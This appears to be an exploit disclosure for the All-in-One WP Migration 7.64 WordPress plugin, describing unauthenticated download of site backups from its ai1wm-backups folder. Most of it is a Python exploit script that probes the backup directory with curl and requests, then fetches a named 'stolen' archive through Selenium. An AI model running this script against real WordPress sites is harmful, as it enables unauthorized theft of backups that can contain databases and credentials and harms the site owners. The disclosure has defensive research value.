## [All-in-One WP Migration-7.64](https://servmask.com/)

## [vendor](https://wordpress.org/plugins/all-in-one-wp-migration/)

![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/WordPress/2022/All-in-One-WP-Migration/Docs/Screenshot%202022-09-01%20123436.png)

## Description:
The All-in-One-WP-Migration-7.64 suffers from low-protection-file-disclosure - Unauthenticated Backup Download.
The attacker can hit some directory with some strong customizing fuzzing software, and he can download 
very sensitive information about this system, it depends on the case. 
WARNING! This vulnerability can be VERY DANGEROUS!

Status: Medium-HIGH

[+] Exploit:

```python
#!/usr/bin/python
# Author nu11secur1ty
from selenium import webdriver
import time
import os
from colorama import init, Fore, Back, Style
init(convert=True)
import requests

target='http://pwnedhost.com/wordpress/wp-content/ai1wm-backups/'
print("Test if you can access the directory\n")
time.sleep(3)

print(Fore.GREEN +"Please wait...\n")
print(Style.RESET_ALL)
time.sleep(5)
print(Fore.BLUE +"The Access status of the directory is...\n")
print(Style.RESET_ALL)
print(Fore.YELLOW +"The Access status of the directory is...\n")
dir_check = os.system('curl -I -v -c cookie -b cookie http://pwnedhost.com/wordpress/wp-content/ai1wm-backups/')
print(Style.RESET_ALL)

status = requests.get(target)
print(Fore.BLUE+"ATTENTION! The status of the code for accessing the directory is:",status)
print(Style.RESET_ALL)

if status.status_code == 200:
    print(Fore.RED +"The Access status of the directory is lowlily protected...")
    print(Style.RESET_ALL)
else:
    print(Fore.RED +"The Access status of the directory is strongly protected...\n")
    print(Style.RESET_ALL)
    
stolen_archive=input("Give the stolen name of the archive...\n")
driver = driver = webdriver.Firefox()
driver.get('http://pwnedhost.com/wordpress/wp-content/ai1wm-backups/' + stolen_archive)

print(Fore.RED +"Happy hunting with nu11secur1ty =)")
print(Style.RESET_ALL)

```

## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/WordPress/2022/All-in-One-WP-Migration)

## Proof and Exploit:
[href](https://streamable.com/m3xcxv)

## More:
[href](https://twitter.com/nu11secur1ty1/status/1565324894086332419?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1565324894086332419%7Ctwgr%5E4a052a09a6429c86edaa04966a9e2d88c0ea89c0%7Ctwcon%5Es1_c10&ref_url=https%3A%2F%2Fpublish.twitter.com%2F%3Fquery%3Dhttps3A2F2Ftwitter.com2Fnu11secur1ty12Fstatus2F1565324894086332419widget%3DTweet)

## CONCLUSION:
Administrator folders have no place in broadcast networks!
To not see the files in some directory path of URL and access them, is NOT SECURITY! 
Blocking the directories, for the usual users in the broadcast network - this is SECURITY. ðŸ™‚ 

The price of the PATCH is 1000000$. ðŸ¤« ðŸ˜› ðŸ˜Ž
